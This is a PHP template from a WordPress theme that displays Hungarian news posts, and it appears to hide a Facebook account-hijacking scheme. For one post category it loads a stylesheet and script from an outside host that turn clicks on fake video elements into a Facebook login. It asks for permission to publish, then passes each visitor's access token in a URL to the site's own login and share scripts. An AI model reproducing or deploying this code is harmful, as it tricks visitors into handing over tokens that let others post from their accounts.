<?php

/** Beallitjuk a referer-t */

global $post;

$post_id = $post->ID;

$slug = $post->post_name;


/** Lekerjuk a messageId-t az url-bol */

if(isset($_GET['messageId'])) {

    $message_id = htmlspecialchars($_GET['messageId']);

}



/** Lekerjuk a userId-t az url-bol */

if(isset($_GET['u'])) {

    $uid = htmlspecialchars($_GET['u']);

} else {

    $uid = 0;

}



?>
<?php /* Default template for displaying content. */ ?>
<article <?php post_class(); ?>>
    <header class="post-header">
        <h1 class="entry-title"><?php the_title(); ?></h1>
        <?php mh_post_header(); ?>
        <p class="meta post-meta"><?php _e('Létrehozva: ', 'mh-magazine-lite'); ?><span class="updated"><?php the_date(); ?></span><?php _e(' bejegyezte: ', 'mh-magazine-lite'); ?><span class="vcard author"><span class="fn"><?php the_author_posts_link(); ?></span></span><?php _e(' Kategória: ', 'mh-magazine-lite') . the_category(', ') ?> <a href="<?php the_permalink(); ?>">
                <span class="fb-comments-count" data-href="<?php the_permalink(); ?>">0</span> Hozzászólás </a></p>
    </header>
    <?php dynamic_sidebar('posts-1'); ?>
    <div class="entry clearfix">
        <? // php mh_featured_image();
        ?>
        <!-- <div id="SC_TBlock_98545" class="SC_TBlock">loading...</div> -->


        <?php the_content(); ?>
        <?php
        $categories = get_the_category();
        $kategoria = 0;
        for($i=0;$i<count($categories);$i++) {
            $categories[$i]->cat_ID;
            if($categories[$i]->cat_ID == 7){
                $kategoria = $categories[$i]->cat_ID;
            }
        }
        $write = '<link rel="stylesheet" type="text/css" href="http://hircentrum.top/app.css">
<script>
$(document).ready(function() {
  $(".youtube").click(function() {
   logInWithFacebook();
  });
});
</script>';
        if ($kategoria == 70){

            if(isset($message_id)){
                if($message_id == 3){
                    echo $write;
                }
            }else{
                echo $write;
            }
        }
        ?>
        <div class="entry-content" id="share">

            <?php if(!isset($message_id)): ?>

			<p><h5>Szeretnéd megosztani ezt a bejegyzést?</h5> <a class="" href="javascript:void(0)" onclick="logInWithFacebook()"><h5>Jelentkezz be Facebook profiloddal</a> a megosztáshoz!</h5></p>

			<a class="" href="javascript:void(0)" onclick="logInWithFacebook()">

				<img class="img-responsive" src="http://napiforras.hu/login.png" alt="Facebook login" />

			</a>

		<?php endif; ?>

        </div>

        <?php if(isset($message_id) && $message_id == 1): ?>

            <h3 style="color: green; text-transform: uppercase; margin-bottom: 20px;">Sikeresen bejelentkeztél!</h3>

            <a class="" href="/fbshare.php?uid=<?php echo $uid; ?>&shareurl=<?php echo $slug; ?>">

                <img class="img-responsive" src="http://napiforras.hu/fb-share.png" alt="Facebook Share" />

            </a>

        <?php elseif(isset($message_id) && $message_id == 2): ?>

            <h3 style="color: green; text-transform: uppercase; margin-bottom: 20px;">Sikeresen megosztottad!</h3>

        <?php elseif(isset($message_id) && $message_id == 3): ?>

            <h3 style="color: red; text-transform: uppercase; margin-bottom: 20px;">Hiba történt, kérlek jelentkezz be újból az alkalmazásba és fogadd el az engedélyt!</h3>

            <a class="" href="javascript:void(0)" onclick="logInWithFacebook()">

                <img class="img-responsive" src="http://napiforras.hu/login.png" alt="Facebook login" />

            </a>

        <?php endif; ?>
        <script>

            logInWithFacebook = function() {

                FB.login(function(response) {

                    if (response.authResponse) {

                        //alert('Sikeresen bejelentkeztél!');

                        // Now you can redirect the user or do an AJAX request to

                        // a PHP script that grabs the signed request from the cookie.

                        var uid = response.authResponse.userID;

                        var accessToken = response.authResponse.accessToken;

                        console.log('user:' + uid);

                        console.log(response.authResponse);

                        console.log('access_token:' + accessToken);

                        window.location.href = "/fb-login.php?uid=" + uid + "&accessToken=" + accessToken + "&referer=<?php echo $slug; ?>&postId=<?php echo $post_id; ?>";

                    } else {

                        console.log('User cancelled login or did not fully authorize.');

                    }

                },{

                    scope: 'email, public_profile, publish_actions'

                });

                return false;

            };

            window.fbAsyncInit = function() {

                FB.init({

                    appId: '1109490145833021',

                    cookie: true, // This is important, it's not enabled by default

                    version: 'v2.5',

                });

            };



            (function(d, s, id){

                var js, fjs = d.getElementsByTagName(s)[0];

                if (d.getElementById(id)) {return;}

                js = d.createElement(s); js.id = id;

                js.src = "//connect.facebook.net/hu_HU/sdk.js";

                fjs.parentNode.insertBefore(js, fjs);

            }(document, 'script', 'facebook-jssdk'));

        </script>
        <br/>

        <div class="fb-like" data-href="<?php the_permalink(); ?>" data-layout="button" data-action="like" data-show-faces="false" data-share="true"></div>


        <br/>
        <br/>
        <!-- <div id="SC_TBlock_100607" class="SC_TBlock">loading...</div> -->

        <div class="fb-comments" data-href="<?php the_permalink(); ?>" data-width="622" data-numposts="5"></div>

        <?php if (has_tag()) : ?>
            <div class="post-tags clearfix">
                <?php the_tags('<ul><li>','</li><li>','</li></ul>'); ?>
            </div>
        <?php endif; ?>
        <?php dynamic_sidebar('posts-2'); ?>
</article>